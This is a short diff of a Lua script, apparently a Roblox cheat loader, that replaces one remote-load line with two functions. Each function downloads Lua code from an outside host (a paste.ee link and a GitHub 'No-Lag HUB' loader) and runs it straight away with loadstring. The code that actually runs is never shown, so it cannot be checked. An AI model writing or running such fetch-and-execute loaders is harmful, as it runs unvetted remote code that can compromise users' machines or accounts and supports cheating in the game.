@@ -1,1 +1,9 @@
-loadstring(game:HttpGet("https://pastefy.app/TOZ87hix/raw"))()
+local function gui()
+    loadstring(game:HttpGet("https://paste.ee/r/sMASDpqL"))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
+end
+ 
+task.spawn(gui)
+task.spawn(farm) 
